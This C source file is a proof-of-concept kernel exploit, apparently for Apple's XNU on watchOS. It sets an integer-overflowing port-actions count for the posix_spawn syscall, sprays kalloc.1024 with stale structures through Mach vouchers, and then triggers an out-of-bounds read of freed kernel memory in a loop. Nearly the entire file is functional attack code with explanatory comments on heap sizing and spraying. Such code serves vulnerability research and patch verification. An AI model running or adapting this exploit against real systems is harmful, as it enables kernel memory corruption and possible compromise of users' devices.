#include <stdio.h>
#include <stdlib.h>
// you will have to comment out the __WATCHOS_PROHIBITED stuff which this PoC uses from the headers to get it to compile :)
#include <spawn.h>
#include <unistd.h>

#include <mach/mach.h>
#include <mach/mach_traps.h>


extern int
posix_spawnattr_setprocesstype_np(posix_spawnattr_t * __restrict attr,
                                  const int proctype);

#include "spawner.h"

#if 0
struct _ps_mac_policy_extension {
  char      policyname[128];
  void     *datap;
  uint64_t    datalen;
};

struct extension_wrapper {
  int alloc;
  int count;
  struct _ps_mac_policy_extension exts[10000];
};
#endif

typedef enum {
  PSPA_SPECIAL = 0,
  PSPA_EXCEPTION = 1,
  PSPA_AU_SESSION = 2,
  PSPA_IMP_WATCHPORTS = 3,
} pspa_t;

typedef struct _ps_port_action {
  pspa_t      port_type;
  exception_mask_t  mask;
  mach_port_name_t  new_port;
  exception_behavior_t  behavior;
  thread_state_flavor_t  flavor;
  int      which;
} _ps_port_action_t; // 24 bytes

struct posix_spawn_port_actions {
  int      pspa_alloc;
  int      pspa_count;
  _ps_port_action_t   pspa_actions[];
};




void go() {
  printf("hello!\n(");
  
  mach_port_t port = MACH_PORT_NULL;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  // we want to fill a kalloc.1024 allocation with full ones, so allocate that much at least
  
  struct posix_spawn_port_actions* actions = malloc(2000);
  
  actions->pspa_alloc = 0;
  actions->pspa_count = 0x40000016; // (8 + (24*pspa_count)) must equal port_actions_size
  
  // aim for kalloc.1024, we want a size which is smaller so it will read stale data off the end
  // which we will spray:
  
  // pspa_count = 0x40000016 (0x16 = 22 decimal)
  // implies a port_actions size of (22*24)+8 = 536
  // this will put the input data in kalloc.1024
  
  // prior to calling the vulnerable function we'll need to fill kalloc.1024 with stale data in the correct format
  // since it will read off the end
  
  
  _ps_port_action_t action = {0};
  action.port_type = PSPA_IMP_WATCHPORTS;
  action.new_port = port;
  
  for (int i = 0; i < (1500/24); i++) {
    actions->pspa_actions[i] = action;
  }
  
  // that filled at least 1024 bytes with the correct structure - spray kalloc.1024 with free'd versions of it:
  
  
  
  posix_spawnattr_t attrs;
  posix_spawnattr_init(&attrs);
  posix_spawnattr_setprocesstype_np(&attrs, 0x600); //POSIX_SPAWN_PROC_TYPE_DAEMON_ADAPTIVE
  posix_spawnattr_setflags(&attrs,POSIX_SPAWN_SETEXEC); // no fork!
  
  
  struct user32__posix_spawn_args_desc {
    uint32_t  attr_size;  /* size of attributes block */
    uint32_t  attrp;    /* pointer to block */
    uint32_t  file_actions_size;  /* size of file actions block */
    uint32_t  file_actions;  /* pointer to block */
    uint32_t  port_actions_size;  /* size of port actions block */
    uint32_t  port_actions;  /* pointer to block */
    uint32_t  mac_extensions_size;
    uint32_t  mac_extensions;
    uint32_t  coal_info_size;
    uint32_t  coal_info;
    uint32_t  persona_info_size;
    uint32_t  persona_info;
  } args_desc = {0};
  
  args_desc.attr_size = 1234; // ignored anyway
  args_desc.attrp = (uint32_t) attrs; //(*(uint32_t*)attrs);
  
  args_desc.port_actions = (uint32_t)actions;
  args_desc.port_actions_size = 536; // 8 + (24*22)
  
  // syscall: 244  AUE_POSIX_SPAWN  ALL  { int posix_spawn(pid_t *pid, const char *path, const struct _posix_spawn_args_desc *adesc, char **argv, char **envp) NO_SYSCALL_STUB; }
  
  pid_t pid = 0;
  char* path = "/usr/bin/id";
  char* _argv[] = {"/usr/bin/id", NULL};
  
  for (int i = 0; i < 100; i++) {
    // fill a kalloc.1024 allocation with the data we want, then free it
    mach_port_t voucher = MACH_PORT_NULL;
    host_create_mach_voucher(mach_host_self(), (void*) actions, 1000, &voucher);
    
    printf("spawning...\n");
    // call the vulnerable function, hopefully reusing that just filled and free'd allocation:
    int ret = syscall(244, &pid, path, &args_desc, _argv, NULL);
    //int ret = __posix_spawn(&pid, path, &args_desc, _argv, NULL);
    printf("ret: %x\n", ret);
  }

}


